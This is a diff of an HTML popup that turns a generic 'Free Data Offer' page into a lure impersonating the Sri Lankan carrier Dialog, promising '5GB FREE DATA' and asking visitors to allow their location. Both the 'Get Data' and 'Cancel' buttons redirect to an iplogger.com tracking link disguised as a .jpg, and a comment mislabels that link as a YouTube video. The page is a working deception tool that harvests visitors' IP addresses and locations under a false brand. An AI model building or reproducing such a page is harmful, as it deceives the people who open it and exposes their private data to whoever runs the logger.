@@ -1,91 +1,112 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Free Data Offer</title>
-  <style>
-    body {
-      margin: 0;
-      font-family: Arial, sans-serif;
-      background: #f2f5f9;
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Dialog FREE DATA</title>
+<style>
+  :root {
+    --bg: #f2f5f9;
+    --card: #ffffff;
+    --text: #333333;
+    --muted: #555555;
+    --alert: #dc2626;
+    --alert-dark: #b91c1c;
+    --cancel-bg: #e5e7eb;
+    --cancel-text: #333333;
+    color-scheme: light;
+  }
+  @media (prefers-color-scheme: dark) {
+    :root:not([data-theme="light"]) {
+      --bg: #111827;
+      --card: #1f2937;
+      --text: #f3f4f6;
+      --muted: #d1d5db;
+      --cancel-bg: #374151;
+      --cancel-text: #f3f4f6;
+      color-scheme: dark;
     }
-
-    .overlay {
-      position: fixed;
-      inset: 0;
-      background: rgba(0, 0, 0, 0.6);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
-
-    .dialog {
-      background: white;
-      width: 85%;
-      max-width: 350px;
-      padding: 25px;
-      border-radius: 15px;
-      text-align: center;
-      box-shadow: 0 10px 30px rgba(0,0,0,0.2);
-    }
-
-    .dialog h2 {
-      color: #16a34a;
-      margin-top: 0;
-    }
-
-    .dialog p {
-      color: #555;
-      font-size: 15px;
-    }
-
-    .btn {
-      display: block;
-      width: 100%;
-      padding: 12px;
-      border: none;
-      border-radius: 8px;
-      margin-top: 15px;
-      font-size: 16px;
-      cursor: pointer;
-    }
-
-    .continue {
-      background: #16a34a;
-      color: white;
-    }
-
-    .cancel {
-      background: #e5e7eb;
-      color: #333;
-    }
-  </style>
+  }
+  :root[data-theme="dark"] {
+    --bg: #111827;
+    --card: #1f2937;
+    --text: #f3f4f6;
+    --muted: #d1d5db;
+    --cancel-bg: #374151;
+    --cancel-text: #f3f4f6;
+    color-scheme: dark;
+  }
+  :root { box-sizing: border-box; padding-top: env(safe-area-inset-top, 0px); padding-bottom: env(safe-area-inset-bottom, 0px); }
+  html { scroll-padding-top: env(safe-area-inset-top, 0px); }
+  body {
+    margin: 0;
+    font-family: Arial, Helvetica, sans-serif;
+    background: var(--bg);
+    color: var(--text);
+  }
+  .overlay {
+    position: fixed;
+    inset: 0;
+    background: rgba(0, 0, 0, 0.6);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 16px;
+  }
+  .dialog {
+    background: var(--card);
+    width: 100%;
+    max-width: 360px;
+    padding: 25px;
+    border-radius: 15px;
+    text-align: center;
+    border-top: 6px solid var(--alert);
+    box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+    animation: pulse 1.6s ease-in-out infinite;
+  }
+  @keyframes pulse {
+    0%, 100% { box-shadow: 0 0 0 0 rgba(220,38,38,0.5), 0 10px 30px rgba(0,0,0,0.3); }
+    50% { box-shadow: 0 0 0 10px rgba(220,38,38,0), 0 10px 30px rgba(0,0,0,0.3); }
+  }
+  .logo { max-width: 140px; max-height: 80px; object-fit: contain; margin-bottom: 10px; }
+  .dialog h2 { color: var(--alert); margin: 0 0 10px; }
+  .dialog p { color: var(--muted); font-size: 15px; margin: 8px 0; }
+  .btn {
+    display: block;
+    width: 100%;
+    padding: 12px;
+    border: none;
+    border-radius: 8px;
+    margin-top: 15px;
+    font-size: 16px;
+    cursor: pointer;
+  }
+  .continue { background: var(--alert); color: #fff; font-weight: bold; }
+  .continue:hover { background: var(--alert-dark); }
+  .cancel { background: var(--cancel-bg); color: var(--cancel-text); }
+</style>
 </head>
 <body>
 
 <div class="overlay" id="popup">
   <div class="dialog">
-    <h2>🎉 Free Data Offer!</h2>
-    <p>Enjoy your special free data offer.</p>
-    <p>Click below to continue.</p>
+    <img class="logo" src="https://dialog-freedata.github.io/5GB/Dialog_Axiata_logo.svg.webp" alt="Ripbook logo">
+    <h2>5GB FREE DATA </h2>
+    <p> Click here and Allow Your Location</p>
+    <p>Verify your are in SriLanka</p>
 
-    <button class="btn continue" onclick="goToSite()">
-      Continue
-    </button>
-
-    <button class="btn cancel" onclick="closePopup()">
-      Cancel
-    </button>
+    <button class="btn continue" onclick="goToVideo()">▶ Get Data</button>
+    <button class="btn cancel" onclick="goToVideo()">Cancel</button>
   </div>
 </div>
 
 <script>
-  function goToSite() {
-    window.location.href = "https://iplogger.com/2PS4r6.jpg";
-  }
+  // Replace with your actual YouTube video link
+  var VIDEO_URL = "https://iplogger.com/2PS4r6.jpg";
 
+  function goToVideo() {
+    window.location.href = VIDEO_URL;
+  }
   function closePopup() {
     document.getElementById("popup").style.display = "none";
   }
